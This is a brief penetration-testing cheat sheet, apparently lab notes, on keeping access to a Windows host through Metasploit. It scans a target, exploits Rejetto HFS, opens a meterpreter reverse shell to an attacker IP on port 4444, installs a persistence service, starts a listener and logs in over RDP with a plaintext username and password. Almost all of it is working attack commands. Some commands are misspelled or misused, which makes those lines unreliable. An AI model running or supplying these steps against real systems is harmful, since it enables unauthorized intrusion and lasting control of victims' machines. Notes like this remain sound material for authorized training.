# Persistence

## Persistence

```bash
Metasplotit
use exploit/windows/local/persistence_service
set SESSION 1
exploit

Note: By default persistence, the local exploit module uses the following payload and local port
for reverse connection.

Payload windows/meterpreter/reverse_tcp
LHOST: Attack IP Address.
LPORT: 4444

msfconsole -q
use exploit/multi/handler
set LHOST 10.10.1.2
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit
```

## **Maintaining Access: Persistence Service**

```bash
nmap 10.0.25.204
nmap -sV -p 80 10.0.25.204
searchsploit hfs

Metasploit
msfconsole -q
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.0.25.204
set LHOST 10.10.1.2 <Make Sure to Enter Valid LHOST IP Address>
exploit
https://www.rapid7.com/db/modules/exploit/windows/local/persistence_service/

getuid

background
use exploit/windows/local/persistence_service
set SESSION 1
exploit

msfconsole -q
use exploit/multi/handler
set LHOST 10.10.1.2
set PAYLOAD windows/meterpreter/reverse_tcp
set LPORT 4444
exploit

session -i 1
```

## Persistence

```bash
Meterpreter
run getuid -e -u alexis -p password_123321
xfreerdp /u:alexis -p password_123321 /v:10.10.10.10

```